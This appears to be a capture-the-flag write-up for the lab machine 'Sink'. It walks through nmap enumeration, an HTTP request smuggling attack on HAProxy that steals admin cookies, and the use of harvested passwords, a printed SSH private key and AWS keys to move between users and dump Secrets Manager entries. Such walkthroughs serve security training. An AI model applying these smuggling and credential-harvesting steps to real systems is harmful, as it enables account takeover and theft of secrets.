# Sink

![Screen Shot 2021-09-22 at 04 31 21](https://user-images.githubusercontent.com/87259078/134336059-21f1a0ac-2792-428e-98a6-781aef7c4153.png)

# Enumeration

```
⛩\> nmap -sC -sV -Pn -v -oA enum 10.129.71.3
Nmap scan report for 10.129.71.3
Host is up (0.27s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
3000/tcp open  ppp?
| fingerprint-strings:
|   GenericLines, Help:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=1652a28bd4aecaf1; Path=/; HttpOnly
|     Set-Cookie: _csrf=yiZfamQCp2jezeelDu7GlVLTMJk6MTYxNjY1NjQ0NjA2MjEzMzgzOA; Path=/; Expires=Fri, 26 Mar 2021 07:14:06 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 25 Mar 2021 07:14:06 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Gitea: Git with a cup of tea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|     <meta name="description" content="Gitea (Git with a cup of tea) is a painless
|   HTTPOptions:
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=8bcf80e69747c02c; Path=/; HttpOnly
|     Set-Cookie: _csrf=f4LiMkcvysewTg7sU42glOPCkGQ6MTYxNjY1NjQ1MjQ3MTA0MzI1Mg; Path=/; Expires=Fri, 26 Mar 2021 07:14:12 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 25 Mar 2021 07:14:12 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Gitea: Git with a cup of tea </title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <meta name="theme-color" content="#6cc644">
|     <meta name="author" content="Gitea - Git with a cup of tea" />
|_    <meta name="description" content="Gitea (Git with a c
5000/tcp open  http    Gunicorn 20.0.0
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: gunicorn/20.0.0
|_http-title: Sink Devops
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.91%I=7%D=3/25%Time=605C383D%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,2943,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/;
SF:\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=1652a28bd4aecaf1;
SF:\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=yiZfamQCp2jezeelDu7GlVL
SF:TMJk6MTYxNjY1NjQ0NjA2MjEzMzgzOA;\x20Path=/;\x20Expires=Fri,\x2026\x20Ma
SF:r\x202021\x2007:14:06\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x20SAMEOR
SF:IGIN\r\nDate:\x20Thu,\x2025\x20Mar\x202021\x2007:14:06\x20GMT\r\n\r\n<!
SF:DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-\">\n<head\x
SF:20data-suburl=\"\">\n\t<meta\x20charset=\"utf-8\">\n\t<meta\x20name=\"v
SF:iewport\"\x20content=\"width=device-width,\x20initial-scale=1\">\n\t<me
SF:ta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\t<title>
SF:\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea\x20</title>\n\t<link
SF:\x20rel=\"manifest\"\x20href=\"/manifest\.json\"\x20crossorigin=\"use-c
SF:redentials\">\n\t<meta\x20name=\"theme-color\"\x20content=\"#6cc644\">\
SF:n\t<meta\x20name=\"author\"\x20content=\"Gitea\x20-\x20Git\x20with\x20a
SF:\x20cup\x20of\x20tea\"\x20/>\n\t<meta\x20name=\"description\"\x20conten
SF:t=\"Gitea\x20\(Git\x20with\x20a\x20cup\x20of\x20tea\)\x20is\x20a\x20pai
SF:nless")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(HTTPOptions,206D,"HTTP/1\.0\x20404\x20Not\x20Found\r\
SF:nContent-Type:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en
SF:-US;\x20Path=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=8b
SF:cf80e69747c02c;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=f4LiMkcv
SF:ysewTg7sU42glOPCkGQ6MTYxNjY1NjQ1MjQ3MTA0MzI1Mg;\x20Path=/;\x20Expires=F
SF:ri,\x2026\x20Mar\x202021\x2007:14:12\x20GMT;\x20HttpOnly\r\nX-Frame-Opt
SF:ions:\x20SAMEORIGIN\r\nDate:\x20Thu,\x2025\x20Mar\x202021\x2007:14:12\x
SF:20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"the
SF:me-\">\n<head\x20data-suburl=\"\">\n\t<meta\x20charset=\"utf-8\">\n\t<m
SF:eta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sc
SF:ale=1\">\n\t<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edg
SF:e\">\n\t<title>Page\x20Not\x20Found\x20-\x20\x20Gitea:\x20Git\x20with\x
SF:20a\x20cup\x20of\x20tea\x20</title>\n\t<link\x20rel=\"manifest\"\x20hre
SF:f=\"/manifest\.json\"\x20crossorigin=\"use-credentials\">\n\t<meta\x20n
SF:ame=\"theme-color\"\x20content=\"#6cc644\">\n\t<meta\x20name=\"author\"
SF:\x20content=\"Gitea\x20-\x20Git\x20with\x20a\x20cup\x20of\x20tea\"\x20/
SF:>\n\t<meta\x20name=\"description\"\x20content=\"Gitea\x20\(Git\x20with\
SF:x20a\x20c");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nmap reveals that target is running services on port 22, 3000 and 5000. The two non-standard ports are running HTTP services. Below is the homepage of port 3000, it’s running Gitea application version 1.12.6 and it is not vulnerable. We can’t signup for, tho we can sign-in if we have username & password.

![Screen Shot 2021-05-03 at 05.37.01.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6D651E52-D7B7-45B0-8F46-578057E8ACF8/F034013A-D3E5-4AA4-A151-84DFC6A8E63B_2/Screen%20Shot%202021-05-03%20at%2005.37.01.png)

Below is homepage of port 5000, we can signup on this.

![Screen Shot 2021-05-03 at 05.47.35.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6D651E52-D7B7-45B0-8F46-578057E8ACF8/4EFA2D53-A431-44A5-ADFC-5BFCE8DD4CAC_2/Screen%20Shot%202021-05-03%20at%2005.47.35.png)

Let’s signup and login.

![Screen Shot 2021-05-03 at 05.50.01.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6D651E52-D7B7-45B0-8F46-578057E8ACF8/18323F2D-1317-4457-A809-7C93D802C8F6_2/Screen%20Shot%202021-05-03%20at%2005.50.01.png)

Looks like a WordPress site, we got hostname, comment section at end of the page and notes section . Everything else is static.

![Screen Shot 2021-05-03 at 05.51.16.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6D651E52-D7B7-45B0-8F46-578057E8ACF8/81A4E4F7-E125-418E-970D-F904B6E8365D_2/Screen%20Shot%202021-05-03%20at%2005.51.16.png)

In notes tab we can save notes.

![Screen Shot 2021-05-03 at 05.53.57.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6D651E52-D7B7-45B0-8F46-578057E8ACF8/E4C1F1D7-FDB2-476F-8E1E-C276B3BE1228_2/Screen%20Shot%202021-05-03%20at%2005.53.57.png)

Let’s add hostname to hosts file.

```
⛩\> sudo sh -c "echo '10.129.71.3  sink.htb' >> /etc/hosts"
```

Let’s look into response header for both HTTP ports.

```
⛩\> curl -s -I -X POST sink.htb:5000
HTTP/1.1 200 OK
Server: gunicorn/20.0.0
Date: Mon, 03 May 2021 13:02:50 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 9648
Via: haproxy
X-Served-By: ecccc85cc666

⛩\> curl -s -I -X POST sink.htb:3000
HTTP/1.1 404 Not Found
Content-Type: text/html; charset=UTF-8
Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
Set-Cookie: i_like_gitea=cccdecf2494e556d; Path=/; HttpOnly
Set-Cookie: _csrf=IWJYiqpZkmuBDCqwcpyCtLuPEiY6MTYyMDA0NzM1NTE1NDExNzUyNA; Path=/; Expires=Tue, 04 May 2021 13:09:15 GMT; HttpOnly
X-Frame-Options: SAMEORIGIN
Date: Mon, 03 May 2021 13:09:15 GMT
Transfer-Encoding: chunked
```

For port 5000, ‘Green Unicorn’ (gunicorn) application is being used as backend server and ‘HAProxy’ is being used as frontend server (load balancing and high availability).  Gunicorn version is 20.0, let’s find the HAProxy version.

```
⛩\> curl sink.htb:5000 --head --haproxy-protocol
HTTP/1.0 400 Bad request
Server: haproxy 1.9.10
Cache-Control: no-cache
Connection: close
Content-Type: text/html
```

We got HAProxy version that is 1.9.10. Let’s look for any vulnerabilities in these two applications.

[HAProxy HTTP request smuggling](https://gist.github.com/ndavison/4c69a2c164b2125cd6685b7d5a3c135b)

[Help you understand HTTP Smuggling in one article](https://blog.zeddyu.info/2019/12/08/HTTP-Smuggling-en/)

HTTP Request Smuggling vulnerability (HTTP Desync Attack) exists in the HAProxy version 1.9.10. By exploiting this vulnerability we can steal session cookies of admin and takeover the account.

To exploit this vulnerability we take advantage of any POST requests like commecnt section. Intercept this request on BurpSuite and send it to repeater.

![Screen Shot 2021-05-06 at 05.07.25.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6D651E52-D7B7-45B0-8F46-578057E8ACF8/A30992AB-3612-4809-BDBE-20DCFCAC5588_2/Screen%20Shot%202021-05-06%20at%2005.07.25.png)

![Screen Shot 2021-05-06 at 05.10.36.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6D651E52-D7B7-45B0-8F46-578057E8ACF8/A47C6257-26C3-43B0-B543-B8331AC9FA2B_2/Screen%20Shot%202021-05-06%20at%2005.10.36.png)

In our scenario two servers are involved, frontend and backend. Depending upon the configuration of the servers they accept either Content-Length (CL) or Transfer-Encoding (TE), these both represents where the body starts and where it ends. Take an example of above request, the content-length value is 8 because our body is ‘msg=test’ is of 8 characters. If the content length was 4 but the actual body length was 8 then it’d remove whatever comes after first 4 characters.

![Screen Shot 2021-05-06 at 08.32.10.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6D651E52-D7B7-45B0-8F46-578057E8ACF8/0FE4EE3D-4E00-4892-BEF6-BBE7381B19A0_2/Screen%20Shot%202021-05-06%20at%2008.32.10.png)

The above image is an example of Chunked Transfer-Encoding (TE) header request example, we are telling the server the body length is 8 followed by body and followed by 0 to let server know that there’s nothing left to send.

Now we need to modify above request headers to exploit the HTTP Desync vulnerability. First enable \n from burpsuite, it enables and shows you non-printable characters. We need to add both CL and TE to the request to smuggle the data. The idea here is to smuggle another POST request with the initial one, the frontend server parse the request by looking at the CL and send it to backend. Now backend checks for TE and parse it accordingly.

Below is the modified request header. As you can see I have added both CL and TE, if you send this request we’d not get desired result and that is admin cookies. The reason behind this is, the frontend server accepts both headers, so according to [RFC 2616](https://www.ietf.org/rfc/rfc2616.txt) - If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored. So to confuse the server we need to add obfuscated data to TE value, by doing so the frontend server will ignore TE as it can't able to read the value of TE, so it checks CL and parses it and forward it to backend. But backend only accepts TE, it parses it an gives repsonse accordingly.

![Screen Shot 2021-05-06 at 07.21.41.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6D651E52-D7B7-45B0-8F46-578057E8ACF8/86A13ECA-EC8B-4337-867A-3B0DAE5E0073_2/Screen%20Shot%202021-05-06%20at%2007.21.41.png)

From line 20 to 27 is our actual payload. As I said backend server parses the TE header and gives response, but TE 0 is end of the message-body. The remaining message-body from line 20-27 will be appended to next request. Root is running a script on machine which will respond POST requests with admin credentials and posts admin session cookies in comment section.

The below is modified request with obfuscated TE value.

![Screen Shot 2021-05-07 at 00.23.40.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6D651E52-D7B7-45B0-8F46-578057E8ACF8/B15AB30D-0210-4C38-9E84-A278F1BAD1D1_2/Screen%20Shot%202021-05-07%20at%2000.23.40.png)

As you can see from above image, I have modified the request header to exploit the vulnerability.

- On line 10 you have to modify ‘Connection’ from close to ‘keep-alive’, it is an instruction that allows a single TCP connection to remain open for multiple HTTP requests/responses.
- On line 14 we need to add a header ‘Transfer-Encoding: chunked’, we are telling the server that we are going to send data in pieces (chunked). To get the ‘0b’ as value you have to type Cwo= (it’s base64 encoded) and select it and press CTRL + SHIFT + B to decode the encoded value you’d get ‘0b’.
- On line 16 is length of the message-body, on line 17 is actual message and on line 18 we are stating that it’s end of the message-body.
- From line 20 to 27 is another POST request that will appended to coming request and it gives us admin cookies.

Note: Make sure to use your own cookies.

Once you send the request, go back to webpage and refresh the page. You will see comments, one is initial comment and another is admin cookies.

![Screen Shot 2021-05-07 at 00.34.21.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6D651E52-D7B7-45B0-8F46-578057E8ACF8/47342A69-6747-48FB-A73D-8F3BF04EC3A4_2/Screen%20Shot%202021-05-07%20at%2000.34.21.png)

Now we use these cookies in cookie-editor add-on to access admin account. Save the cookie and refresh the page.

![Screen Shot 2021-05-07 at 00.35.29.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6D651E52-D7B7-45B0-8F46-578057E8ACF8/CF2882B7-BD8A-43F3-A592-5D0710BD62EB_2/Screen%20Shot%202021-05-07%20at%2000.35.29.png)

![Screen Shot 2021-05-07 at 00.36.24.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6D651E52-D7B7-45B0-8F46-578057E8ACF8/97C5E31C-340C-486B-83E6-E447FDCE8342_2/Screen%20Shot%202021-05-07%20at%2000.36.24.png)

We took over admin session, let’s check notes for any infomration.

![Screen Shot 2021-05-07 at 00.38.56.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6D651E52-D7B7-45B0-8F46-578057E8ACF8/829AF2E9-1788-4EF7-B494-6D73E6908638_2/Screen%20Shot%202021-05-07%20at%2000.38.56.png)

There are three notes, let’s read all the notes.

![Screen Shot 2021-05-07 at 00.37.54.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6D651E52-D7B7-45B0-8F46-578057E8ACF8/79FE554A-06D3-4237-B3F0-5C859268BC41_2/Screen%20Shot%202021-05-07%20at%2000.37.54.png)

![Screen Shot 2021-05-07 at 00.38.13.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6D651E52-D7B7-45B0-8F46-578057E8ACF8/7070C28C-30EE-44AC-B775-BAA38F07028F_2/Screen%20Shot%202021-05-07%20at%2000.38.13.png)

![Screen Shot 2021-05-07 at 00.38.32.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6D651E52-D7B7-45B0-8F46-578057E8ACF8/EEB6EFEE-B941-4460-927D-B55450CE8935_2/Screen%20Shot%202021-05-07%20at%2000.38.32.png)

```plaintext
Chef Login : [http://chef.sink.htb](http://chef.sink.htb) Username : chefadm Password : /6'fEGC&zEx{4]zz 

Dev Node URL : [http://code.sink.htb](http://code.sink.htb) Username : root Password : FaH@3L>Z3})zzfQ3

Nagios URL : [https://nagios.sink.htb](https://nagios.sink.htb) Username : nagios_adm Password : g8<H6GK{*L.fB3C
```

We got credentials of users with their links. Let’s try these credentials on GITEA sign in. If we check current users on GITEA, we’d find three.

![Screen Shot 2021-05-07 at 00.40.04.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6D651E52-D7B7-45B0-8F46-578057E8ACF8/47378F2B-E9B9-4060-A2A7-47AB60966FE8_2/Screen%20Shot%202021-05-07%20at%2000.40.04.png)

We have three GITEA users and we got three user credentials from admin notes. We don’t have credentials for David and Marcus, but we do have credentials of root. Let’s login using root creds.

![Screen Shot 2021-05-07 at 00.43.40.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6D651E52-D7B7-45B0-8F46-578057E8ACF8/3A47A142-C02E-45E3-96BA-86C2F448422D_2/Screen%20Shot%202021-05-07%20at%2000.43.40.png)

After login, let’s check the root user repositories.

![Screen Shot 2021-05-07 at 00.44.33.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6D651E52-D7B7-45B0-8F46-578057E8ACF8/DA6AC658-4675-4F7B-96EE-7E5C49647B15_2/Screen%20Shot%202021-05-07%20at%2000.44.33.png)

Let’s check Key_Management repository for any key’s.

![Screen Shot 2021-05-07 at 00.49.03.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6D651E52-D7B7-45B0-8F46-578057E8ACF8/1FA01DC5-EF5A-4746-9B20-2573B5E4352D_2/Screen%20Shot%202021-05-07%20at%2000.49.03.png)

In ec2.php file they have mentioned SSH keys, but there’s no any keys in any of the files. Let’s check the ‘commits’.

![Screen Shot 2021-05-07 at 00.55.07.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6D651E52-D7B7-45B0-8F46-578057E8ACF8/BFA5FC11-45E7-46A3-BA08-E97A6B5933AD_2/Screen%20Shot%202021-05-07%20at%2000.55.07.png)

If we look into EC2 Key Management Structure Message, the we’d see SSH private key. This message is pushed by ‘Marcus”.

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

As this message is pushed by marcus, so try to SSH as marcus.

```
⛩\> pwncat ssh://marcus@sink.htb -i marcus_id_rsa
[04:00:40] new host w/ hash 06123e2741b651d493edfad75c045918                                              victim.py:321
[04:00:48] pwncat running in /usr/bin/bash                                                                victim.py:354
[04:00:51] pwncat is ready 🐈                                                                             victim.py:771
[04:00:56] user not found in database; not storing password                                              connect.py:348
(remote) marcus@sink:/$ id
uid=1001(marcus) gid=1001(marcus) groups=1001(marcus)
```

I am using PWNCAT to ssh, as this tool has many features.

[calebstewart/pwncat](https://github.com/calebstewart/pwncat)

```
(remote) marcus@sink:/home/marcus$ cat user.txt
88ab3ac32f9255c4b30ee1e1aacb7049
```

In one of the commit of Log_Management repository we find AWS credentials, following is the link to that commit. [http://sink.htb:3000/root/Log_Management/raw/commit/e8d68917f2570f3695030d0ded25dc95738fb1ba/create_logs.php](http://sink.htb:3000/root/Log_Management/raw/commit/e8d68917f2570f3695030d0ded25dc95738fb1ba/create_logs.php)

```
<?php
require 'vendor/autoload.php';

use Aws\CloudWatchLogs\CloudWatchLogsClient;
use Aws\Exception\AwsException;

$client = new CloudWatchLogsClient([
    'region' => 'eu',
    'endpoint' => 'http://127.0.0.1:4566',
    'credentials' => [
        'key' => 'AKIAIUEN3QWCPSTEITJQ',
        'secret' => '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'
    ],
    'version' => 'latest'
]);
try {
$client->createLogGroup(array(
    'logGroupName' => 'Chef_Events',
));
}
catch (AwsException $e) {
    echo $e->getMessage();
    echo "\n";
}
try {
$client->createLogStream([
    'logGroupName' => 'Chef_Events',
    'logStreamName' => '20201120'
]);
}catch (AwsException $e) {
    echo $e->getMessage();
    echo "\n";
}
?>
```

We can use these keys to make programmatic calls to AWS endpoints. Now we need to configure AWS to interact with endpoints.

```
(remote) marcus@sink:/home/marcus$ aws configure
AWS Access Key ID [None]: AKIAIUEN3QWCPSTEITJQ
AWS Secret Access Key [None]: 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
Default region name [None]: eu
Default output format [None]: text
```

The above information is stored in a profile for further usage. Now we need to access the endpoint and retrieve any stored Information in secrets manager.

```
(remote) marcus@sink:/home/marcus$ aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager list-secrets
SECRETLIST  arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-gBWXn  Master Server to manage release cycle 1     Jenkins Login   False
ROTATIONRULES   0
113192E8-EB28-4509-8137-45D48490BC25    AWSCURRENT
SECRETLIST  arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-QmEPl A panel to manage the resources in the devnode      Sink Panel  False
ROTATIONRULES   0
4E4C200B-6804-428F-9AD5-FC14A17E4C50    AWSCURRENT
SECRETLIST  arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-DmnFT   Manage customer issues      Jira Support    False
ROTATIONRULES   0
7E4A1B3A-870B-4C2B-83FE-867C24489266    AWSCURRENT
```

We got three ARN (Amazon Resource Name) infomration from secrets manager. Now we need to read the value from these three ARN resources.

```
(remote) marcus@sink:/home/marcus$ aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager get-secret-value --secret-id "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-gBWXn"
arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-gBWXn  1620300492  Jenkins Login   {"username":"john@sink.htb","password":"R);\)ShS99mZ~8j"}   113192e8-eb28-4509-8137-45d48490bc25
VERSIONSTAGES   AWSCURRENT

(remote) marcus@sink:/home/marcus$ aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager get-secret-value --secret-id "arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-QmEPl"
arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-QmEPl 1620300492  Sink Panel  {"username":"albert@sink.htb","password":"Welcome123!"} 4e4c200b-6804-428f-9ad5-fc14a17e4c50
VERSIONSTAGES   AWSCURRENT

(remote) marcus@sink:/home/marcus$ aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager get-secret-value --secret-id "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-DmnFT"
arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-DmnFT   1620300492  Jira Support    {"username":"david@sink.htb","password":"EALB=bcC=`a7f2#k"} 7e4a1b3a-870b-4c2b-83fe-867c24489266
VERSIONSTAGES   AWSCURRENT
```

We got credentials to three users. Let’s find any of those users are available on the host.

```
(remote) marcus@sink:/home/marcus$ grep -w "/bin/bash" /etc/passwd
root:x:0:0:root:/root:/bin/bash
marcus:x:1001:1001:,,,:/home/marcus:/bin/bash
david:x:1000:1000:,,,:/home/david:/bin/bash
git:x:115:123:Git Version Control,,,:/home/git:/bin/bash
```

We have ‘David’ user on the host, and we also got his credentials from secrets manager. Let’s access his shell.

```
(remote) marcus@sink:/home/marcus$ su david
Password:
david@sink:/home/marcus$ id
uid=1000(david) gid=1000(david) groups=1000(david)
```

If we look into one of the directory, then we’d find  a encrypted file.

```
david@sink:~/Projects/Prod_Deployment$ file servers.enc
servers.enc: data
```

